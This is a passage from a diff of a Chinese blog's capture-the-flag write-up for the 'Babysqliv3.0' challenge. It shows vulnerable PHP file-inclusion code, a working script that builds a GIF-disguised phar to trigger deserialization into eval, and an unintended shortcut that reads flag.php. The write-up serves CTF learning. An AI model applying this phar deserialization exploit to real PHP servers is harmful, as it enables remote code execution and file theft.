file_get_contents($uploader);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>home.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">echo &quot;&lt;meta http-equiv&#x3D;\&quot;Content-Type\&quot; content&#x3D;\&quot;text&#x2F;html; charset&#x3D;utf-8\&quot; &#x2F;&gt; &lt;title&gt;Home&lt;&#x2F;title&gt;&quot;;</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_SESSION[&#39;user&#39;]))&#123;</span><br><span class="line">	if(isset($_GET[&#39;file&#39;]))&#123;</span><br><span class="line">		if(preg_match(&quot;&#x2F;.?f.?l.?a.?g.?&#x2F;i&quot;, $_GET[&#39;file&#39;]))&#123;</span><br><span class="line">			die(&quot;hacker!&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">		else&#123;</span><br><span class="line">			if(preg_match(&quot;&#x2F;home$&#x2F;i&quot;, $_GET[&#39;file&#39;]) or preg_match(&quot;&#x2F;upload$&#x2F;i&quot;, $_GET[&#39;file&#39;]))&#123;</span><br><span class="line">				$file &#x3D; $_GET[&#39;file&#39;].&quot;.php&quot;;</span><br><span class="line">			&#125;</span><br><span class="line">			else&#123;</span><br><span class="line">				$file &#x3D; $_GET[&#39;file&#39;].&quot;.fxxkyou!&quot;;</span><br><span class="line">			&#125;</span><br><span class="line">			echo &quot;å½åå¼ç¨çæ¯ &quot;.$file;</span><br><span class="line">			require $file;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	else&#123;</span><br><span class="line">		die(&quot;no permission!&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>代码审计可知，存在可控参数$_GET[‘name]并且当this-&gt;token == $_SESSION[‘user’]时可以执行eval($this-&gt;cmd)函数，利用phar反序列化解题即可</p>
+<p>首先上传任意文件，得到$_SESSION[‘user’]</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GXYf3ccadb4ef0535e40f455b2664479262</span><br></pre></td></tr></table></figure>
+<p>给出生成phar的PHP代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Uploader&#123;</span><br><span class="line">	public $Filename;</span><br><span class="line">	public $cmd;</span><br><span class="line">	public $token;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$o &#x3D; new Uploader();</span><br><span class="line">$o-&gt;cmd &#x3D; &#39;highlight_file(&quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;);&#39;; &#x2F;&#x2F;里面的命令不要出现单引号否侧生成phar会报错</span><br><span class="line">$o-&gt;Filename &#x3D; &#39;test&#39;;</span><br><span class="line">$o-&gt;token &#x3D; &#39;GXYf3ccadb4ef0535e40f455b2664479262&#39;; &#x2F;&#x2F;$_SESSION[&#39;user&#39;]</span><br><span class="line">echo serialize($o);</span><br><span class="line"></span><br><span class="line">$phar &#x3D; new Phar(&quot;phar.phar&quot;);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); &#x2F;&#x2F;设置stub，增加gif文件头</span><br><span class="line">$phar-&gt;setMetadata($o); &#x2F;&#x2F;将自定义meta-data存入manifest</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); &#x2F;&#x2F;添加要压缩的文件</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>
+<p>上传生成的phar.phar文件，得到路径</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;c04a544d2136e74a467867f1c6a5097f&#x2F;GXYf3ccadb4ef0535e40f455b2664479262.txt</span><br></pre></td></tr></table></figure>
+<p>利用name参数和phar://并上传文件来实现反序列化，读取flag即可</p>
+<p><img src="/2020/02/04/%E5%AE%89%E6%81%92%E6%9D%AF%E6%96%B0%E6%98%A5%E7%A5%88%E7%A6%8F%E8%B5%9B/5.png" alt></p>
+<h3 id="非预期解法"><a href="#非预期解法" class="headerlink" title="非预期解法"></a>非预期解法</h3><p>上传文件名为flag.php的文件，因为有</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo file_get_contents($uploader);</span><br></pre></td></tr></table></figure>
+<p>就很尴尬………………</p>
+<p><img src="/2020/02/04/%E5%AE%89%E6%81%92%E6%9D%AF%E6%96%B0%E6%98%A5%E7%A5%88%E7%A6%8F%E8%B5%9B/6.png" alt></p>
 
-    }
-    else{
-        die("no permission!");
-    }
-}
-?>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">代码审计可知，存在可控参数$_GET[&#39;name]并且当this-&gt;token &#x3D;&#x3D; $_SESSION[&#39;user&#39;]时可以执行eval($this-&gt;cmd)函数，利用phar反序列化解题即可</span><br><span class="line"></span><br><span class="line">首先上传任意文件，得到$_SESSION[&#39;user&#39;]</span><br></pre></td></tr></table></figure>
-<p>GXYf3ccadb4ef0535e40f455b2664479262</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">给出生成phar的PHP代码</span><br></pre></td></tr></table></figure>
-<?php
-class Uploader{
-    public $Filename;
-    public $cmd;
-    public $token;
-}
-
-$o = new Uploader();
-$o->cmd = 'highlight_file("/var/www/html/flag.php");'; //里面的命令不要出现单引号否侧生成phar会报错
-$o->Filename = 'test';
-$o->token = 'GXYf3ccadb4ef0535e40f455b2664479262'; //$_SESSION['user']
-echo serialize($o);
-
-$phar = new Phar("phar.phar");
-$phar->startBuffering();
-$phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?><p>“); //设置stub，增加gif文件头<br>$phar-&gt;setMetadata($o); //将自定义meta-data存入manifest<br>$phar-&gt;addFromString(“test.txt”, “test”); //添加要压缩的文件<br>$phar-&gt;stopBuffering();</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">上传生成的phar.phar文件，得到路径</span><br></pre></td></tr></table></figure>
-<p>/var/www/html/uploads/c04a544d2136e74a467867f1c6a5097f/GXYf3ccadb4ef0535e40f455b2664479262.txt</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">利用name参数和phar:&#x2F;&#x2F;并上传文件来实现反序列化，读取flag即可</span><br><span class="line"></span><br><span class="line">![](安恒杯新春祈福赛&#x2F;5.png)</span><br><span class="line"></span><br><span class="line">### 非预期解法</span><br><span class="line">上传文件名为flag.php的文件，因为有</span><br></pre></td></tr></table></figure>
-<p>echo file_get_contents($uploader);</p>
-<pre><code>就很尴尬………………
-
-![](安恒杯新春祈福赛/6.png)</code></pre>
       
       
     
@@ -515,7 +413,7 @@ $phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?><p>“); //设置stub，增�
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#枯燥的抽奖"><span class="toc-number">1.1.</span> <span class="toc-text">枯燥的抽奖</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BabySqli"><span class="toc-number">1.2.</span> <span class="toc-text">BabySqli</span></a></li></ol></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#枯燥的抽奖"><span class="toc-number">1.1.</span> <span class="toc-text">枯燥的抽奖</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BabySqli"><span class="toc-number">1.2.</span> <span class="toc-text">BabySqli</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#代码参考"><span class="toc-number">1.2.1.</span> <span class="toc-text">代码参考</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BabySqli2-0"><span class="toc-number">1.3.</span> <span class="toc-text">BabySqli2.0</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目说明"><span class="toc-number">1.3.1.</span> <span class="toc-text">题目说明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#waf探测"><span class="toc-number">1.3.2.</span> <span class="toc-text">waf探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#注数据库名"><span class="toc-number">1.3.3.</span> <span class="toc-text">注数据库名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#注表名"><span class="toc-number">1.3.4.</span> <span class="toc-text">注表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#查询字段"><span class="toc-number">1.3.5.</span> <span class="toc-text">查询字段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#查询字段-1"><span class="toc-number">1.3.6.</span> <span class="toc-text">查询字段</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Babysqliv3-0"><span class="toc-number">1.4.</span> <span class="toc-text">Babysqliv3.0</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#预期解法"><span class="toc-number">1.4.1.</span> <span class="toc-text">预期解法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#非预期解法"><span class="toc-number">1.4.2.</span> <span class="toc-text">非预期解法</span></a></li></ol></li></ol></li></ol>
                     </div>
                 </span>
             </div>
